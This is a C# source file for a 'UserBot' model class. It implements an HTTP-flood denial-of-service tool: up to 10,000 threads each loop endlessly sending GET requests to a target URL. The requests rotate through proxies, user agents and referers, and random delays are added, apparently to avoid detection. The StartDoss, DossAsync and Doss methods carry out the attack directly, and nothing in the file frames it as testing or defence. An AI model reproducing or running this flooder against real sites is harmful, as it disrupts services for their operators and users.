using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UserBot.Controllers;

namespace UserBot.Models
{
    public class Bot : INotifyPropertyChanged
    {
        private string address;
        private ObservableCollection<string> proxy;
        private ObservableCollection<string> userAgent;
        private ObservableCollection<string> referer;
        private int numberThreads;
        private int timeMin;
        private int timeMax;
        private bool followingLinks;

        public event Action<string> ErrorEvent;

        public string Address
        {
            get { return address; }
            set
            {
                if (value.IsUrl() || value == "http://web-client.loc/")
                {
                    address = value;
                    OnPropertyChanged("Address");
                }
                else
                {
                    ErrorEvent("The variable is not a URL.");
                }
            }
        }
        public ObservableCollection<string> Proxy
        {
            get { return proxy; }
            set 
            { 
                proxy = value.IsListIPAddress();
                OnPropertyChanged("Proxy");
            }
        }
        public ObservableCollection<string> UserAgents
        {
            get { return userAgent; }
            set 
            { 
                userAgent = value.IsStringList();
                OnPropertyChanged("UserAgents");
            }
        }
        public ObservableCollection<string> Referers
        {
            get { return referer; }
            set 
            { 
                referer = value.IsListUrl();
                OnPropertyChanged("Referers");
            }
        }
        public int NumberThreads
        {
            get { return numberThreads; }
            set
            {
                if (value < 1 || value > 10000)
                {
                    ErrorEvent("The argument does not match a range of 1 to 10, 000.");
                }
                numberThreads = value;
                OnPropertyChanged("NumberThreads");
            }
        }
        public int TimeMin
        {
            get { return timeMin; }
            set
            {
                if (value < 1 || value > 1000000)
                {
                    ErrorEvent("The argument does not match a range of 1 to 1000000.");
                }
                timeMin = value;
                OnPropertyChanged("TimeMin");
            }
        }
        public int TimeMax
        {
            get { return timeMax; }
            set
            {
                if (value < 1 || value > 1000000 || value < TimeMin)
                {
                    ErrorEvent("The argument does not match a range of 1 to 1000000.");
                }
                timeMax = value;
                OnPropertyChanged("TimeMax");
            }
        }
        public bool FollowingLinks 
        {
            get { return followingLinks; }
            set 
            {
                followingLinks = value;
                OnPropertyChanged("FollowingLinks");
            } 
        }

        public Bot(string address)
        {
            Address = address;
        }
        public Bot(string address, ObservableCollection<string> proxy, ObservableCollection<string> userAgents, ObservableCollection<string> referers, int numberThreads, int timeMin, int timeMax, bool followingLinks)
        {
            Address = address;
            Proxy = proxy;
            UserAgents = userAgents;
            Referers = referers;
            NumberThreads = numberThreads;
            TimeMin = timeMin;
            TimeMax = timeMax;
            FollowingLinks = followingLinks;
        }

        public void StartDoss()
        {
            for(int i = 0; i < NumberThreads; i++)
            {
                DossAsync();
            }
        }

        public async void DossAsync()
        {
            await Task.Factory.StartNew(Doss);
        }

        public string Doss()
        {
            Random rand = new Random();
            while (true)
            {
                WebController.GetHtml(Address,
                    Proxy != null ? Proxy[rand.Next(0, Proxy.Count)] : null,
                    UserAgents != null ? UserAgents[rand.Next(0, userAgent.Count)] : null,
                    Referers != null ? Referers[rand.Next(0, referer.Count)] : null);
                Thread.Sleep(rand.Next(TimeMin, TimeMax));
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;
        public void OnPropertyChanged([CallerMemberName]string prop = "")
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(prop));
        }
    }
}
